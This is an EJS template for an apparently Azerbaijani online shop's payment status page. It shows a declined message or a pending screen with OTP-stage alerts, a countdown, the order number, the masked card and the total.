<section class="section">
  <div class="container">
    <div style="max-width:640px;margin:0 auto">
      <div class="card">
        <div class="card__body text-center">
          <% if (screen.declined) { %>
            <h1 style="font-size:1.4rem"><%= t('status.rejected') %></h1>
            <div class="alert alert--error"><%= order.adminNote || 'Ödəniş rədd edildi.' %></div>
            <a href="/<%= locale %>/odenis/<%= order._id %>" class="btn btn--primary">Yenidən cəhd et</a>
          <% } else { %>
            <div id="stageBox"
                 data-status-url="/api/payment/<%= order._id %>/status"
                 data-order-id="<%= order._id %>"
                 data-stage="<%= screen.stage %>"
                 data-stage-seconds="<%= screen.stageSeconds %>"
                 data-seconds-left="<%= screen.secondsLeft %>">

              <h1 style="font-size:1.35rem" data-stage-title><%= screen.title %></h1>

              <div data-stage-alert class="alert alert--error" style="<%= screen.wrongCode ? '' : 'display:none' %>">
                <strong>Səhv OTP kodu daxil etmisiniz.</strong><br>Yeni kod göndərilir…
              </div>

              <%- include('../partials/countdown-ring') %>

              <p class="sec-note" data-stage-note><%= screen.note %></p>

              <dl class="kv" style="text-align:left;margin-top:20px">
                <dt><%= t('payment.orderLabel') %></dt><dd><%= order.orderNo %></dd>
                <dt><%= t('payment.methodCard') %></dt><dd class="mono"><%= cardMasked || '—' %></dd>
                <dt><%= t('checkout.total') %></dt><dd class="mono"><%= order.total.toFixed(2) %> ₼</dd>
              </dl>

              <p class="sec-note mt-16">Bu ekranı bağlamayın — nəticə avtomatik görünəcək.</p>
            </div>
          <% } %>
        </div>
      </div>
    </div>
  </div>
</section>

<script src="/public/js/secure-flow.js?v=<%= assetV %>" defer></script>
